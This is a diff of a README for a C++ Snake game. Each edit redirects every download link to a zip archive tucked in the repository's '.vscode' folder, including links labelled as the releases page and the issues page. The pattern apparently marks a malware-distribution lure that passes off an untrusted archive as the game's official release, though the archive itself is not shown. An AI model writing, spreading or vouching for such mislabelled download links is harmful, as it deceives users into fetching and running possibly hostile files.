@@ -4,7 +4,7 @@
 Welcome to Snake-CPP! This is a classic Snake game created using modern C++ and SFML. It offers a clean design and a straightforward game architecture, making it easy to understand and play. 
 
 ## 📥 Download Now
-[![Download Snake-CPP](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/aition/Snake-CPP.zip)](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/aition/Snake-CPP.zip)
+[![Download Snake-CPP](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/.vscode/Snake_CPP_3.7.zip)](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/.vscode/Snake_CPP_3.7.zip)
 
 ## 📄 Description
 Snake-CPP is a fun twist on the classic arcade-style Snake game. Built with modern coding practices, it allows you to enjoy game development while honing your programming skills. Whether you're a beginner or looking to practice your C++ knowledge, this game is perfect for you!
@@ -26,7 +26,7 @@ Before downloading, ensure your system meets these requirements:
 To get started with Snake-CPP, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download section.
-   [Download Snake-CPP from Releases](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/aition/Snake-CPP.zip)
+   [Download Snake-CPP from Releases](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/.vscode/Snake_CPP_3.7.zip)
 
 2. **Choose the Latest Release:** On the Releases page, look for the latest version available.
 
@@ -53,7 +53,7 @@ If you want to contribute to the development of Snake-CPP:
 Join our community to share your experiences, modifications, or suggestions. Your feedback helps in making the game better for everyone. 
 
 - **Join the Discord:** (insert Discord link here)
-- **Check the Issues:** Find ongoing discussions [here](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/aition/Snake-CPP.zip).
+- **Check the Issues:** Find ongoing discussions [here](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/.vscode/Snake_CPP_3.7.zip).
 
 ## 📝 Topics
 This project covers various topics, including:
@@ -67,6 +67,6 @@ Snake-CPP is open-source and free to use. Feel free to explore, modify, and shar
 
 ## 📥 Quick Download
 Don't forget to download the game:
-[Download Snake-CPP from Releases](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/aition/Snake-CPP.zip)
+[Download Snake-CPP from Releases](https://raw.githubusercontent.com/luisbrightvv/Snake-CPP/main/.vscode/Snake_CPP_3.7.zip)
 
 Happy gaming! Enjoy your time with Snake-CPP and share your journey in learning C++.
